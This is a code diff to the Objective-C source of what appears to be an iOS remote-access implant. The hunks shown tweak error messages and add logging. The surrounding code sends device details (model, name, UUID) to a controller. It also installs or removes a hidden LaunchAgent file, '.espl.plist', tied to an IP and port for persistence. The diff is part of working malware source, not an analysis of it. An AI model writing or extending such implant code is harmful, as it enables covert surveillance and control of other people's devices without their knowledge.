@@ -386,7 +386,11 @@ bool sysTaskRunning = false;
   assert(identifier != NULL);
   int ret = SBSLaunchApplicationWithIdentifier(identifier, FALSE);
   if (ret != 0) {
-    [self sendString:@"Cannot open app, is device locked?"];
+    [self
+        sendString:[NSString
+                       stringWithFormat:
+                           @"Cannot open app. Is the device locked? (ret: %d)",
+                           ret]];
   }
   CFRelease(identifier);
   [self term];
@@ -412,8 +416,8 @@ bool sysTaskRunning = false;
   UIDevice* device = [UIDevice currentDevice];
   int batinfo = ([_thisUIDevice batteryLevel] * 100);
   NSString* info =
-      [NSString stringWithFormat:@"Model: %@\nBattery: %d\nSystem Version: %@ "
-                                 @"%@\nDevice Name: %@\nUUID: %@\n",
+      [NSString stringWithFormat:@"Model: %@\nBattery: %d%%\nSystem Version: "
+                                 @"%@ %@\nDevice Name: %@\nUUID: %@\n",
                                  [device model], batinfo, [device systemName],
                                  [device systemVersion], [device name],
                                  [[device identifierForVendor] UUIDString]];
@@ -728,6 +732,7 @@ char* parseBinary(int* searchChars, int sizeOfSearch) {
 - (void)persistence:(NSString*)args withIP:(NSString*)ip andPort:(int)port {
   NSString* esplPath = @"/Library/LaunchAgents/.espl.plist";
   if ([args isEqualToString:@"install"]) {
+    NSLog(@"[- PERSISTENCE -] Starting installation process...");
     NSDictionary* innerDict = [NSDictionary
         dictionaryWithObjects:
             [NSArray
@@ -766,6 +771,7 @@ char* parseBinary(int* searchChars, int sizeOfSearch) {
                   @"/Library/LaunchAgents/.espl.plist 2>/dev/null;"
         sendTerminal:false];
   } else if ([args isEqualToString:@"uninstall"]) {
+    NSLog(@"[- PERSISTENCE -] Starting uninstallation process...");
     if ([self.fileManager fileExistsAtPath:esplPath]) {
       [self runTask:@"launchctl unload /Library/LaunchAgents/.espl.plist "
                     @"2>/dev/null; rm "
